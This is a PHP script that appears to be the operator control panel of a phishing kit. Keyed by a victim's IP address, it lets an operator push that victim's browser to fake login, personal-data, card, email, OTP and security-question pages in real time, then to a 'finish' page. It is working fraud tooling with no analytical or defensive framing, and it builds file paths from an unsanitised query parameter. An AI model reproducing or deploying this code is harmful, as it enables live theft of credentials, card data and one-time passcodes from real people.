<?php
error_reporting(0);
ini_set('display_errors', 0);
$ip = $_GET['ip'];
if ($_POST['button'] == "submit") {
    $action = $_POST['action'];
   if ($action == "2") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/personal.html');
    echo '<center><h1 style="color: green;"><br><br>Personal Page Send Successfully<h1></center>';
   } elseif ($action == "7") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/login.html');
    echo '<center><h1 style="color: green;"><br><br>Login Page Send Successfully<h1></center>';
   } elseif ($action == "5") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/success.html');
    echo '<center><h1 style="color: green;"><br><br>Finishing Page Send Successfully<h1></center>';
   } elseif ($action == "4") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/email.html');
    echo '<center><h1 style="color: green;"><br><br>Email Page Send Successfully<h1></center>';
   } elseif ($action == "3") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/oops.html');
    echo '<center><h1 style="color: green;"><br><br>Card Page Send Successfully<h1></center>';
   } elseif ($action == "8") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/data.html');
    echo '<center><h1 style="color: green;"><br><br>OTP Page Send Successfully<h1></center>';
   } elseif ($action == "11") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/questions.html');
    echo '<center><h1 style="color: green;"><br><br>Questions Page Send Successfully<h1></center>';
   }

   
} else {
    $file = file_get_contents('tmp/'.$ip.'.txt');
    if ($file == "0" && $ip != "") {
    echo '<html>
    <head>
        <title>Control</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
    input[type="radio"]:checked:after {
        width: 8px;
        height: 8px;
        border-radius: 15px;
        position: relative;
        background-color: rgb(8, 160, 8);
        content: "";
        display: inline-block;
        visibility: visible;
        border: 2px solid white;
    }
        </style>
    </head>
    <body style="margin-left: 10%; margin-top: 20px;">
        <form method="POST" action="">
            <p>Select your action:</p>
           <input type="radio" name="action" value="2" required>
           <label for="html">Send Personal Page</label><br>

           <input type="radio" name="action" value="7" required>
           <label for="css">Ask Login Again</label><br>

           <input type="radio" name="action" value="8" required>
           <label for="css">Send OTP Page</label><br>

           <input type="radio" name="action" value="5" required>
           <label for="css">Finish</label><br>
           
           <br><br><button type="submit" value="submit" name="button" style="margin-left: 8px;">Submit</button>
          </form>
    </body>
</html>';
        } else {
            echo '<center><h1 style="color: red;"><br><br>Action Not Found<h1></center>'; 
        }
}
?>
<script>
if ( window.history.replaceState ) {
  window.history.replaceState( null, null, window.location.href );
}
</script>